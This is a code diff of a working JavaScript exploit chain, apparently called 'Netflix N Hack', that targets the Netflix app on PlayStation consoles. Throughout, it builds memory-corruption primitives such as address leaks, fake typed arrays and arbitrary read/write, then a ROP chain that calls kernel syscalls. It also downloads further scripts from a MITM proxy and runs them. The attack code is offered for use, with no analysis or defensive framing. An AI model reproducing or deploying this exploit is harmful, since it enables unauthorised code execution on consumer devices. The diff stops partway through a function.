@@ -9,6 +9,8 @@ var is_ps4 = false; // Flag to stop execution after PS4 exploit loads
 
 // #region misc
 
+var FW_VERSION = null;
+
 let SYSCALL = {
     read: 0x3n,
     write: 0x4n,
@@ -65,6 +67,7 @@ let SYSCALL = {
     munmap: 0x49n,
     fsync: 0x5fn,
     ioctl: 0x36n,
+    nmount: 0x17An,
 
     thr_new: 0x1c7n,
     thr_exit: 0x1afn,
@@ -115,6 +118,9 @@ let DLSYM_OFFSETS = {
 
 let eboot_base = 0n;
 
+let prefetch_scratch = null;
+let script_scratch = null;
+
 // FreeBSD constants (https://github.com/PS5Dev/PS5SDK)
 
 const O_RDONLY =	0x0000n;	/* open for reading only */
@@ -144,7 +150,7 @@ const IPV6_PKTINFO = 46n;       /* int; send hop limit */
 const INADDR_ANY =   0n;
 
 const TCP_INFO =         0x20n; /* retrieve tcp_info structure */
-const size_tcp_info =    0xecn  /* struct tcp_info */
+const size_tcp_info =    0xecn;  /* struct tcp_info */
 const TCPS_ESTABLISHED = 4n;
 
 const IPV6_2292PKTOPTIONS = 25n;
@@ -188,151 +194,18 @@ const ws = {
             this.socket.send(msg);
         }
     }
-}
+};
 // #endregion
 // #region Logger
 const logger = {
-    overlay: null,
-    lines: [],
-    widgets: [],
-    maxLines: 40,
-    refreshTimer: null,
-    pendingRefresh: false,
-    init() {
-        this.overlay = nrdp.gibbon.makeWidget();
-        this.overlay.color = { r: 0, g: 0, b: 0, a: 255 };
-        this.overlay.width = 1280;
-        this.overlay.height = 720;
-
-        nrdp.gibbon.scene.widget = this.overlay;
-
-        // Title widget - large red "Netflix N Hack" (centered)
-        var title = nrdp.gibbon.makeWidget({
-            name: "title",
-            x: 380,
-            y: 300,
-            width: 500,
-            height: 100
-        });
-        title.text = {
-            contents: "Netflix N Hack",
-            size: 72,
-            color: { a: 255, r: 255, g: 0, b: 0 },
-            wrap: false
-        };
-        title.parent = this.overlay;
-
-        // Subtitle widget - shown for PS4 (centered below title)
-        this.subtitle = nrdp.gibbon.makeWidget({
-            name: "subtitle",
-            x: 400,
-            y: 420,
-            width: 500,
-            height: 30
-        });
-        this.subtitle.text = {
-            contents: "",
-            size: 22,
-            color: { a: 255, r: 255, g: 100, b: 100 },
-            wrap: false
-        };
-        this.subtitle.parent = this.overlay;
-
-        // Pre-create all text widgets once to avoid removal/recreation overhead
-        for (var i = 0; i < this.maxLines; i++) {
-            var w = nrdp.gibbon.makeWidget({
-                name: "ln" + i,
-                x: 10,
-                y: 10 + (i * 17),
-                width: 1260,
-                height: 15
-            });
-
-            w.text = {
-                contents: "",
-                size: 12,
-                color: {
-                    a: 255,
-                    r: 0,
-                    g: 255,
-                    b: 0
-                },
-                wrap: false
-            };
-
-            w.parent = this.overlay;
-            this.widgets.push(w);
-        }
+    ts_start: null,
+    log(msg)         { ws.send((((Date.now() - this.ts_start) / 1000) | 0) + ' ' + msg); },
+    init()           {
+        this.ts_start = Date.now();
     },
-    log(msg) {
-        ws.send(msg);
-        this.lines.push(msg);
-        if (this.lines.length > this.maxLines) this.lines.shift();
-
-        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
-        this.refreshTimer = nrdp.setTimeout(() => {
-            this.refresh();
-            this.refreshTimer = null;
-        }, 200);
-
-        this.pendingRefresh = true;
-    },
-    refresh() {
-        if (!this.overlay) return;
-
-        // Update widget text content without recreating widgets
-        for (var i = 0; i < this.maxLines; i++) {
-            if (i < this.lines.length) {
-                this.widgets[i].text = {
-                    contents: this.lines[i],
-                    size: 12,
-                    color: {
-                        a: 255,
-                        r: 0,
-                        g: 255,
-                        b: 0
-                    },
-                    wrap: false
-                };
-            } else {
-                // Clear unused widget slots
-                this.widgets[i].text = {
-                    contents: "",
-                    size: 12,
-                    color: {
-                        a: 255,
-                        r: 0,
-                        g: 255,
-                        b: 0
-                    },
-                    wrap: false
-                };
-            }
-        }
-
-        this.pendingRefresh = false;
-    },
-    flush() {
-        // Force immediate refresh if needed (call before blocking operations)
-        if (this.refreshTimer) {
-            nrdp.clearTimeout(this.refreshTimer);
-            this.refreshTimer = null;
-        }
-        if (this.pendingRefresh) {
-            this.refresh();
-        }
-    },
-    setSubtitle(text) {
-        if (this.subtitle) {
-            this.subtitle.text = {
-                contents: text,
-                size: 20,
-                color: { a: 255, r: 255, g: 100, b: 100 },
-                wrap: false
-            };
-        }
-    }
-}
+    flush()          {},
+    setSubtitle(text) {}
+};
 // #endregion
 // #region Pointer Helpers
 const buf = new ArrayBuffer(8);
@@ -379,7 +252,7 @@ const ptr = {
         }
         return `0x${str}`;
     }
-}
+};
 // #endregion
 
 function make_hole () {
@@ -487,7 +360,7 @@ class gadgets {
                 break;
             case 'Gemini-U5-18':        // US 5.000
                 break;
-                
+
             case 'Pollux-U53-7-E':
             case 'Pollux-U53-7-A':
             case 'Pollux-U53-7-J':
@@ -511,14 +384,10 @@ class gadgets {
                         logger.flush();
                     }
                 });
-                logger.setSubtitle("PS4 Detected, Loading Exploit...");
                 is_ps4 = true;
                 return; // Exit constructor, main() will check is_ps4 and return
             default:
-                
                 throw new Error("App version not supported");
-                
-                
         }
     }
     get(gadget) {
@@ -533,7 +402,7 @@ function hook_tryagain(){
             const original_changeLocation = util.changeLocation;
             util.changeLocation = function(url) {
                 logger.log("Reloading Javascript...");
-                
+
                 logger.flush();
 
                 // Load and eval our injected script instead of reloading app
@@ -616,7 +485,7 @@ function main () {
         map1.set(0x10, -1);
         nrdp.gibbon.garbageCollect();
         map1.set(oob_arr_temp, 0x200);
-        
+
 
         if (oob_arr_temp.lenght < 4) {
             throw new Error("Could not create unstable primitives. Try again.");
@@ -658,7 +527,7 @@ function main () {
             let original_value_26 = oob_arr[26];
 
             let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);
-            
+
             oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
             oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0
 
@@ -685,7 +554,7 @@ function main () {
 
             oob_arr[25] = original_value_25;
             oob_arr[26] = original_value_26;
-        }     
+        }
 
         function read32_unstable(add){
             let read = read64_unstable(add);
@@ -696,9 +565,9 @@ function main () {
             let read = read64_unstable(add);
             let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
             write64_unstable(add, new_value);
-        }      
-        
-        
+        }
+
+
         let add_string = addrof_unstable(string) + 12n;
         logger.log("Address of 'string' text: " + hex(add_string));
         let string_value = read32_unstable(add_string);
@@ -780,6 +649,23 @@ function main () {
         const biguint_buffer_elem =     read32_unstable(biguint_buffer + 0x08n);
         const biguint_buffer_bitfield = read32_unstable(biguint_buffer + 0x24n);
 
+        /***** Template for Uint8Array *****/
+        const template_uint8 = new Uint8Array(64);
+
+        const template_uint8_addr = addrof_unstable(template_uint8);
+        const uint8_map =      read32_unstable(template_uint8_addr + 0x00n);
+        const uint8_props =    read32_unstable(template_uint8_addr + 0x04n);
+        const uint8_elements = read32_unstable(template_uint8_addr + 0x08n) - 1n;
+        const uint8_buffer =   read32_unstable(template_uint8_addr + 0x0Cn) - 1n;
+
+        const uint8_elem_map = read32_unstable(uint8_elements + 0x00n);
+        const uint8_elem_len = read32_unstable(uint8_elements + 0x04n);
+
+        const uint8_buffer_map =      read32_unstable(uint8_buffer + 0x00n);
+        const uint8_buffer_props =    read32_unstable(uint8_buffer + 0x04n);
+        const uint8_buffer_elem =     read32_unstable(uint8_buffer + 0x08n);
+        const uint8_buffer_bitfield = read32_unstable(uint8_buffer + 0x24n);
+
         /***** Template for Object Array *****/
         const template_obj_arr = [{},{}];
 
@@ -811,6 +697,10 @@ function main () {
         /***** fake_obj_arr header:     0x0200 (inside rw) *****/
         /***** fake_obj_arr elements:   0x0250 (inside rw) *****/
         /*******************************************************/
+        /***** fake_u8_arr header:      0x0300 (inside rw) *****/
+        /***** fake_u8_arr buffer:      0x0350 (inside rw) *****/
+        /***** fake_u8_arr elements:    0x1150             *****/
+        /*******************************************************/
         /*****       Memory Layout for ROP                 *****/
         /*******************************************************/
         /***** fake_frame init:         0x1250             *****/
@@ -826,7 +716,7 @@ function main () {
         /***** fake_rop_arr buffer:     0x1700             *****/
         /***** fake_rop_arr elements:   0x1600             *****/
         /*******************************************************/
-       
+
         // Inside fake_rw_data: fake Array's elements (at the beginning)
         const fake_rw_obj =             base + 0x0000n;
         const fake_rw_obj_buffer =      base + 0x0040n;
@@ -838,6 +728,10 @@ function main () {
 
         const fake_obj_arr_obj =        base + 0x0200n;
         const fake_obj_arr_elements =   base + 0x0250n;
+
+        const fake_u8_arr_obj =         base + 0x0300n;
+        const fake_u8_arr_buffer =      base + 0x0350n;
+        const fake_u8_arr_elements =    base + 0x1150n;
 
         const fake_frame =              base + 0x1300n; // No need of fake obj
         const fake_bytecode =           base + 0x1400n; // No need of fake obj
@@ -918,6 +812,34 @@ function main () {
         /*******************************************************************************************************/
 
         /*******************************************************************************************************/
+        /********** Init Fake Victim Uint8Array                           **********/
+        /*******************************************************************************************************/
+        write32_unstable(fake_u8_arr_buffer + 0x00n, uint8_buffer_map);
+        write32_unstable(fake_u8_arr_buffer + 0x04n, uint8_buffer_props);
+        write32_unstable(fake_u8_arr_buffer + 0x08n, uint8_buffer_elem);
+        write32_unstable(fake_u8_arr_buffer + 0x0cn, 0x1000n);      // byte_length lower 32b
+        write32_unstable(fake_u8_arr_buffer + 0x14n, fake_u8_arr_elements + 8n +1n);  // backing_store lower 32b
+        write32_unstable(fake_u8_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
+        write32_unstable(fake_u8_arr_buffer + 0x24n, uint8_buffer_bitfield);  // bit_field
+
+        write32_unstable(fake_u8_arr_elements + 0x00n, uint8_elem_map);
+        write32_unstable(fake_u8_arr_elements + 0x04n, uint8_elem_len);  // Fake size in bytes
+
+        write32_unstable(fake_u8_arr_obj + 0x00n, uint8_map);
+        write32_unstable(fake_u8_arr_obj + 0x04n, uint8_props);
+        write32_unstable(fake_u8_arr_obj + 0x08n, fake_u8_arr_elements + 1n);
+        write32_unstable(fake_u8_arr_obj + 0x0Cn, fake_u8_arr_buffer + 1n);
+        write64_unstable(fake_u8_arr_obj + 0x18n, 0x1000n);     // Fake size in bytes
+        write64_unstable(fake_u8_arr_obj + 0x20n, 0x1000n);     // Fake size in elements
+        write32_unstable(fake_u8_arr_obj + 0x28n, fake_u8_arr_buffer + 16n*4n);  // external_pointer lower 32b
+        write32_unstable(fake_u8_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
+        write32_unstable(fake_u8_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
+        write32_unstable(fake_u8_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
+        /*******************************************************************************************************/
+        /********** End Fake Victim Uint8Array                            **********/
+        /*******************************************************************************************************/
+
+        /*******************************************************************************************************/
         /**********                             Init Fake ROP BigUInt64Array                          **********/
         /*******************************************************************************************************/
         write32_unstable(fake_rop_arr_buffer + 0x00n, biguint_buffer_map);
@@ -957,6 +879,9 @@ function main () {
         const fake_obj_arr = create_fakeobj_unstable(fake_obj_arr_obj);
         let fake_obj_arr_add = addrof_unstable(fake_obj_arr);
         //logger.log("This is the add of fake_obj_arr materialized : " + hex(fake_obj_arr_add));
+
+        const fake_victim_8 = create_fakeobj_unstable(fake_u8_arr_obj);
+        // logger.log("This is the add of fake_victim_8 materialized : " + hex(fake_victim_8));
 
         const fake_rop = create_fakeobj_unstable(fake_rop_arr_obj);
         let fake_rop_add = addrof_unstable(fake_rop);
@@ -1023,7 +948,7 @@ function main () {
           write64(add, new_value);
         }
 
-        /***** The following primitives r/w a full 64bits Add *****/        
+        /***** The following primitives r/w a full 64bits Add *****/
 
         function read64_uncompressed (add) {
           let original_value = fake_rw[21];
@@ -1041,36 +966,105 @@ function main () {
         }
 
         function read32_uncompressed(add){
-          let read = read64_uncompressed(add);
-          return  read & 0xffffffffn;
+            let orig = fake_rw[85];
+            fake_rw[85] = add;
+            let v = fake_victim_8[0] | (fake_victim_8[1] << 8) |
+                    (fake_victim_8[2] << 16) | ((fake_victim_8[3] << 24) >>> 0);
+            fake_rw[85] = orig;
+            return BigInt(v >>> 0);
         }
 
         function write32_uncompressed(add, value) {
-          let read = read64_uncompressed(add);
-          let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
-          write64_uncompressed(add, new_value);
+            let orig = fake_rw[85];
+            let v = Number(value);
+            fake_rw[85] = add;
+            fake_victim_8[0] = v & 0xFF;
+            fake_victim_8[1] = (v >> 8) & 0xFF;
+            fake_victim_8[2] = (v >> 16) & 0xFF;
+            fake_victim_8[3] = (v >> 24) & 0xFF;
+            fake_rw[85] = orig;
         }
 
         function read16_uncompressed(add){
-          let read = read64_uncompressed(add);
-          return  read & 0xffffn;
+            let orig = fake_rw[85];
+            fake_rw[85] = add;
+            let v = fake_victim_8[0] | (fake_victim_8[1] << 8);
+            fake_rw[85] = orig;
+            return BigInt(v);
         }
 
         function write16_uncompressed(add, value) {
-          let read = read64_uncompressed(add);
-          let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
-          write64_uncompressed(add, new_value);
+            let orig = fake_rw[85];
+            let v = Number(value);
+            fake_rw[85] = add;
+            fake_victim_8[0] = v & 0xFF;
+            fake_victim_8[1] = (v >> 8) & 0xFF;
+            fake_rw[85] = orig;
         }
 
-        function read8_uncompressed(add){
-          let read = read64_uncompressed(add);
-          return  read & 0xffn;
+        function read8_uncompressed(add) {
+            let original_value = fake_rw[85];
+            fake_rw[85] = add; // Update fake_victim_8's external_ptr
+            let read_value = fake_victim_8[0];
+            fake_rw[85] = original_value;
+            return BigInt(read_value);
         }
 
         function write8_uncompressed(add, value) {
-          let read = read64_uncompressed(add);
-          let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
-          write64_uncompressed(add, new_value);
+            let original_value = fake_rw[85];
+            fake_rw[85] = add; // Update fake_victim_8's external_ptr
+            fake_victim_8[0] = Number(BigInt(value) & 0xffn); // Pure 1-byte STRB write
+            fake_rw[85] = original_value;
+        }
+
+        let _raw8_saved = 0n;
+        function raw8_start(addr) {
+            _raw8_saved = fake_rw[85];
+            fake_rw[85] = addr;
+        }
+        function raw8_end() {
+            fake_rw[85] = _raw8_saved;
+        }
+        function raw8_at(j)      { return fake_victim_8[j]; }
+        function raw8_put(j, v)  { fake_victim_8[j] = v; }
+
+        function xcopy_uncompressed (add_src, add_dst, len, verbose=false) {
+            let orig_8 = fake_rw[85];
+
+            const CHUNK = 4096;
+            const total = Number(BigInt(len));
+
+            const numChunks = Math.ceil(total / CHUNK);
+            const srcAddrs = new Array(numChunks);
+            const dstAddrs = new Array(numChunks);
+            const chunkSizes = new Array(numChunks);
+            for (let c = 0; c < numChunks; c++) {
+                const off = BigInt(c * CHUNK);
+                srcAddrs[c] = add_src + off;
+                dstAddrs[c] = add_dst + off;
+                chunkSizes[c] = Math.min(CHUNK, total - c * CHUNK);
+            }
+
+            const tmp = new Uint8Array(CHUNK);
+
+            if (verbose) logger.log("xcpy_uc total=" + total + " chunks=" + numChunks);
+
+            for (let c = 0; c < numChunks; c++) {
+                if (verbose && !(c & 3)) {
+                    logger.log("xcpy_uc chunk " + c + "/" + numChunks);
+                }
+
+                const n = chunkSizes[c];
+
+                fake_rw[85] = srcAddrs[c];
+                for (let j = 0; j < n; j++) tmp[j] = fake_victim_8[j];
+
+                fake_rw[85] = dstAddrs[c];
+                for (let j = 0; j < n; j++) fake_victim_8[j] = tmp[j];
+            }
+
+            fake_rw[85] = orig_8;
+            if (verbose) logger.log("xcpy_uc done");
         }
 
         function get_backing_store(typed_array) {
@@ -1109,7 +1103,7 @@ function main () {
         //logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
         add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
         add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
-        add_rop_smash_code_store = add_rop_smash_code + 0x22n;        
+        add_rop_smash_code_store = add_rop_smash_code + 0x22n;
 
         //logger.log("Address of fake_frame: 0x" + hex(base_heap_add + fake_frame) );
         //logger.log("Address of fake_bytecode: " + hex(base_heap_add + fake_bytecode) );
@@ -1139,18 +1133,53 @@ function main () {
                                                                       // this is gonna be offseted by R9
         write64(fake_frame  - 0x28n, 0x00n);                          // Force the value of R9 = 0
         write64(fake_frame  - 0x18n, 0xff00000000000000n);            // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
-                                                                          
+
         write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
+
+        let ROP = {
+            get pop_rsp()             { return g.get('pop_rsp');               },
+            get pop_rax()             { return g.get('pop_rax');               },
+            get pop_rdi()             { return g.get('pop_rdi');               },
+            get pop_rsi()             { return g.get('pop_rsi');               },
+            get pop_rdx()             { return g.get('pop_rdx');               },
+            get pop_rcx()             { return g.get('pop_rcx');               },
+            get pop_r8()              { return g.get('pop_r8');                },
+            get ret()                 { return g.get('ret');                   },
+            get mov_qword_rdi_rax()   { return g.get('mov_qword_ptr_rdi_rax'); },
+        };
+
+        // Pre-computed constants and cache state for call_rop.
+        // Declared HERE (before call_rop) so the closure captures already-initialized
+        // bindings. Declaring let/const after a function declaration in the same block
+        // leaves them in the TDZ for the function-hoisted binding, causing ReferenceError.
+        const _cr_stack_offset    = 0x700000001n;
+        const _cr_rop_return_addr = base_heap_add + fake_rop_return;
+        const _cr_fake_frame_lo   = fake_frame & 0xffffffffn;
+        let _cr_cached_rbp    = null;
+        let _cr_rop_primed    = false;
+        let _cr_execute_primed = false;
+        let _cr_caching_active = false;
+        function _cr_reset_cache() { _cr_cached_rbp = null; _cr_rop_primed = false; _cr_execute_primed = false; }
+        function _cr_enable_caching()  { _cr_reset_cache(); _cr_caching_active = true; }
+        function _cr_disable_caching() { _cr_reset_cache(); _cr_caching_active = false; }
 
         // This function is calling a given function address and takes all arguments
         // Returns the value returned by the called function
         function call_rop (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
 
-            write64(add_rop_smash_code_store, 0xab0025n);
-            real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n; // We only leak lower 32bits, stack seems always be at upper 32bits 0x7
-                                                                    // Value is tagged, remove 1n
-                                                                    // Seems offseted by 2 bytes
+            if (_cr_caching_active) {
+                if (_cr_cached_rbp === null) {
+                    write64(add_rop_smash_code_store, 0xab0025n);
+                    _cr_cached_rbp = addrof(rop_smash(1)) + _cr_stack_offset;
+                    _cr_execute_primed = false;
+                }
+                real_rbp = _cr_cached_rbp;
+            } else {
+                write64(add_rop_smash_code_store, 0xab0025n);
+                real_rbp = addrof(rop_smash(1)) + _cr_stack_offset;
+                _cr_execute_primed = false;
+            }
 
             let i = 0;
 
@@ -1177,18 +1206,30 @@ function main () {
 
             // Store return value to fake_rop_return
             fake_rop[i++] = g.get('pop_rdi');
-            fake_rop[i++] = base_heap_add + fake_rop_return;
+            fake_rop[i++] = _cr_rop_return_addr;
             fake_rop[i++] = g.get('mov_qword_ptr_rdi_rax');
 
             // Return to JS
             fake_rop[i++] = g.get('pop_rax');
-            fake_rop[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
+            fake_rop[i++] = 0x2000n;
             fake_rop[i++] = g.get('pop_rsp_pop_rbp');
             fake_rop[i++] = real_rbp;
-            
-            write64(add_rop_smash_code_store, 0xab00260325n);
-            fake_rw[59] = (fake_frame & 0xffffffffn); // Only 32 bits needed
-            rop_smash(fake_obj_arr[0]);               // Call ROP
+
+            if (!_cr_execute_primed) {
+                write64(add_rop_smash_code_store, 0xab00260325n);
+                _cr_execute_primed = true;
+            }
+            // fake_rw[59] is clobbered by addrof() every time it runs (addrof sets
+            // fake_obj_arr[0] which overwrites the same heap slot). Must restore it
+            // after any addrof call. Non-caching: addrof runs every call → always
+            // restore. Caching: addrof only runs on the first call (_cr_cached_rbp
+            // null); after that it is skipped, so fake_rw[59] stays correct and the
+            // write can be skipped.
+            if (!_cr_caching_active || !_cr_rop_primed) {
+                fake_rw[59] = _cr_fake_frame_lo;
+                _cr_rop_primed = true;
+            }
+            rop_smash(fake_obj_arr[0]);
         }
 
         function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
@@ -1206,8 +1247,13 @@ function main () {
         const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x10fa88n);
 
         // Thread for elfldr
-        const Thrd_create = libc_base + 0x4c30n;
-        const Thrd_join = libc_base + 0x4a30n;
+        let Thrd_create = libc_base + 0x4c30n;
+        let Thrd_join = libc_base + 0x4a30n;
+
+        // used in ytjb:
+        // Thrd_create = libc_base + 0x4BF0n;
+        // Thrd_join = libc_base + 0x49F0n;
+
 
         // Used for gpu rw
         const sceKernelAllocateMainDirectMemory = read64_uncompressed(eboot_base + 0x241f6a8n);
@@ -1250,7 +1296,7 @@ function main () {
 
         const mod_info = malloc(0x300);
         const SEGMENTS_OFFSET = 0x160n;
-        
+
         ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
         logger.log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));
 
@@ -1258,24 +1304,39 @@ function main () {
             logger.log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
             throw new Error("sceKernelGetModuleInfoFromAddr failed");
         }
-        
+
         /***** LibKernel *****/
         libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
         logger.log("libkernel_base @ " + hex(libkernel_base));
         logger.flush();
 
-        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) 
-        {            
+        /***** LibC load base *****/
+        ret = call(sceKernelGetModuleInfoFromAddr, libc_strerror, 0x1n, mod_info);
+        if (ret !== 0x0n) throw new Error("sceKernelGetModuleInfoFromAddr(libc) failed: " + hex(ret));
+        const libc_load_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
+        logger.log("libc_load_base @ " + hex(libc_load_base));
+        if (libc_base != libc_load_base) {
+            throw new Error("Invalid libc_base=" + hex());
+        }
+
+        /***** test libc call *****/
+        const test = call(libc_strerror, 12n);
+        logger.log("TEST: strerror(12) = " + read_cstring(test));
+
+        const scePthreadCreate = libkernel_base + 0x73d0n;
+
+        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n)
+        {
             call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
             return read64(fake_rop_return);
         }
 
-        function write_string(addr, str) {            
+        function write_string(addr, str) {
             let bytes = stringToBytes(str);
             for (let i = 0; i < str.length; i++) {
                 write8_uncompressed(addr + BigInt(i), bytes[i]);
             }
-            
+
             write8_uncompressed(addr + BigInt(str.length), 0);
         }
 
@@ -1285,9 +1346,9 @@ function main () {
             for (let i = 0; i < str.length; i++) {
                 write8_uncompressed(addr + BigInt(i), bytes[i]);
             }
-            
+
             write8_uncompressed(addr + BigInt(str.length), 0);
-            
+
             return addr;
         }
 
@@ -1295,29 +1356,29 @@ function main () {
             const notify_buffer_size = 0xc30n;
             const notify_buffer = malloc(Number(notify_buffer_size));
             const icon_uri = "cxml://psnotification/tex_icon_system";
-                                
+
             // Setup notification structure
             write32_uncompressed(notify_buffer + 0x0n, 0);           // type
             write32_uncompressed(notify_buffer + 0x28n, 0);          // unk3
             write32_uncompressed(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
             write32_uncompressed(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
-            
+
             // Write message at offset 0x2D
             write_string(notify_buffer + 0x2dn, text);
-            
+
             // Write icon URI at offset 0x42D
             write_string(notify_buffer + 0x42dn, icon_uri);
-            
+
             // Open /dev/notification0
             const dev_path = alloc_string("/dev/notification0");
             const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
-            
+
             if (Number(fd) < 0) {
                 return;
             }
-            
+
             syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
-            syscall(SYSCALL.close, fd);  
+            syscall(SYSCALL.close, fd);
         }
 
         send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");
@@ -1356,6 +1417,14 @@ function main () {
             return sock;
         }
 
+        let _nanosleep_ts = 0n;
+        function nanosleep_ms(ms) {
+            if (!_nanosleep_ts) _nanosleep_ts = malloc(16);
+            write64_uncompressed(_nanosleep_ts,      BigInt(Math.floor(ms / 1000)));
+            write64_uncompressed(_nanosleep_ts + 8n, BigInt((ms % 1000) * 1000000));
+            syscall(SYSCALL.nanosleep, _nanosleep_ts, 0n);
+        }
+
         function httpGet(sock, path) {
             const request = `GET ${path} HTTP/1.1\r\nHost: ${ip_script}\r\nConnection: close\r\n\r\n`;
             ret = syscall(SYSCALL.write, sock, alloc_string(request), BigInt(request.length));
@@ -1367,8 +1436,8 @@ function main () {
         // It fakes an HTML request to the MITM proxy
         // The proxy intercepts it and respons with the file
         // That needs to be defined in the proxy.py script
-        // Arguments: filename and buffer to store data
-        function fetch_file (filename, buffer_return) {
+        // Arguments: filename, buffer to store data, buffer capacity
+        function fetch_file (filename, buffer_return, buffer_size) {
             let sock;
             let fd = -1n;
             let total_received = 0;
@@ -1376,48 +1445,75 @@ function main () {
                 sock = connectToServer(ip_script_port);       // Connect to the MITM proxy to fake a request
                 httpGet(sock, `/js/${filename}`);
 
-                const buffer = malloc(800*1024);
-                let header_found = false;
-                let search_str = "";
+                let header_bytes = 0;
+                let carry = 0;
 
-                // Loop over the initial part of the data to get the HTTP header
-                while (!header_found) {
-                    const bytes_read = Number(syscall(SYSCALL.read, sock, buffer, 8192n));
-
-                    if (bytes_read <= 0) {
+                while (true) {
+                    const bytes_read = Number(syscall(SYSCALL.read, sock,
+                        prefetch_scratch + BigInt(carry), BigInt(256 - carry)));
+                    if (bytes_read <= 0)
                         throw new Error("Connection closed before HTTP header was found.");
-                    }
-                    for (let i = 0; i < bytes_read; i++) {
-                        search_str += String.fromCharCode(Number(read8_uncompressed(buffer + BigInt(i))),
-                        );
-                    }
+                    const available = carry + bytes_read;
 
-                    const header_end_idx = search_str.indexOf("\r\n\r\n");
-
-                    if (header_end_idx !== -1) {
-                        header_found = true;
-
-                        const body_offset = header_end_idx + 4;
-
-                        if (body_offset < search_str.length) {
-                            const body_part = search_str.substring(body_offset);
-                            for (let i = 0; i < body_part.length; i++) {
-                                write8_uncompressed(buffer_return + BigInt(i), body_part.charCodeAt(i));
-                                total_received++;
-                            }
+                    let orig_8 = fake_rw[85];
+                    fake_rw[85] = prefetch_scratch;
+                    let found_at = -1;
+                    const scan_limit = available - 3;
+                    for (let j = 0; j < scan_limit; j++) {
+                        if (fake_victim_8[j]     === 0x0D &&
+                            fake_victim_8[j + 1] === 0x0A &&
+                            fake_victim_8[j + 2] === 0x0D &&
+                            fake_victim_8[j + 3] === 0x0A) {
+                            found_at = j;
+                            break;
                         }
-                    } else if (search_str.length > 16384) {
+                    }
+                    fake_rw[85] = orig_8;
+
+                    if (found_at >= 0) {
+                        const body_start = found_at + 4;
+                        const prefix_len = available - body_start;
+                        if (prefix_len > 0) {
+                            xcopy_uncompressed(prefetch_scratch + BigInt(body_start),
+                                buffer_return, prefix_len);
+                        }
+                        total_received = prefix_len;
+                        break;
+                    }
+
+                    header_bytes += available;
+                    if (header_bytes > 16384)
                         throw new Error("Could not find HTTP header; response too large");
+
+                    if (available >= 3) {
+                        orig_8 = fake_rw[85];
+                        fake_rw[85] = prefetch_scratch;
+                        const s = available - 3;
+                        const b0 = fake_victim_8[s];
+                        const b1 = fake_victim_8[s + 1];
+                        const b2 = fake_victim_8[s + 2];
+                        fake_victim_8[0] = b0;
+                        fake_victim_8[1] = b1;
+                        fake_victim_8[2] = b2;
+                        fake_rw[85] = orig_8;
+                        carry = 3;
+                    } else {
+                        carry = available;
                     }
                 }
 
-                //logger.log("Received with header bytes: " + total_received);
                 // Loop over the rest of the data
-                while (true) {
-                    const n = syscall(SYSCALL.read, sock, buffer_return + BigInt(total_received), 8192n*8n);
+                while (total_received < buffer_size) {
+                    const remaining = BigInt(buffer_size - total_received);
+                    const chunk = remaining < 65536n ? remaining : 65536n;
+                    const n = syscall(SYSCALL.read, sock, buffer_return + BigInt(total_received), chunk);
                     if (n === 0xffffffffffffffffn || n === 0n) break;
                     total_received += Number(n);
-                    //logger.log("Received after header bytes: " + total_received);
+                }
+                if (total_received >= buffer_size) {
+                    const probe = syscall(SYSCALL.read, sock, prefetch_scratch, 1n);
+                    if (probe !== 0xffffffffffffffffn && probe !== 0n)
+                        throw new Error("fetch_file: response (" + total_received + "+) exceeds buffer size " + buffer_size);
                 }
             } catch (e) {
                 logger.log(`- File download failed: ${e}`);
@@ -1452,30 +1548,155 @@ function main () {
         }
 
 
+        function toHex(num) {
+            return '0x' + BigInt(num).toString(16).padStart(16, '0');
+        }
+
         // Arguments: script_name configured in MITM proxy
         // Returned value: JS String (null if error)
         function get_script(script_name) {
-            const buffer_read = malloc(300*1024);
-            let bytes_received = fetch_file(script_name, buffer_read);
-            let script_str = bytes_to_string(buffer_read, bytes_received);
+            let bytes_received = fetch_file(script_name, script_scratch, 512*1024);
+            let script_str = bytes_to_string(script_scratch, bytes_received);
             return script_str;
         }
 
+        function is_jailbroken() {
